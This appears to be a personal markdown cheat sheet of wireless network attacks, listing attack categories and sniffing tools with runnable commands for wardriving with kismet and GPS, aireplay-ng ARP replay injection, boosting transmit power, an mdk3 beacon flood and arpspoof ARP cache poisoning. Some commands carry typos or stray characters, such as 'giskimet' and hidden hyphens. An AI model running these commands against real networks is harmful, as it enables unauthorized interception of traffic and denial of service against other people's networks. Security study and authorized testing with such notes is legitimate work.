
## access control attacks

* war driving
* rogue access points
* MAC spoofing
* ad hoc associations
* AP misconfigurations
* client misassociation
* unauthorized association
* promiscuous client

## wardriving

```
kismet
```

Improve location accuracy using a USB GPS device

```
apt-get install gpsd
apt-get install gpsd-clients
lsusb
ls /dev/gps*
apt-get install giskimet
giskismet ­-x Kismet-DATE.netxml ­-q "select * 
    from  wireless" ­-o wardrive.kml
```

## sniffing tools

* Dsniff
* Tcpdump
* EtherApe
* Wireshark
* Kismet
* arpspoof

## arpreplay

Once target shows up in aireplay

```
aireplay-ng --arpreplay -b <target BSSID> -h <MAC of connected client> <interface>
aireplay-ng -2 -r ./replay_.cap ath0
```

## turn up signal power

```
iwconfig wlan0 txpower 27
```

## attacking availability

* dissassociation flood
* detecting beacon frames
* spoofing beacon frames
* executing a beacon flood
* executing a deauthentication flood
* ARP cache poisening
* performing a denial of service
* hiding a wireless network

## beacon frame flood

```
mdk3 wlan0mon b -n "impa" -b 54 -w a -m -c 11
```

## arp cache poisening

```
arpspoof -i eth0 -t target-ip target-gateway-ip
```
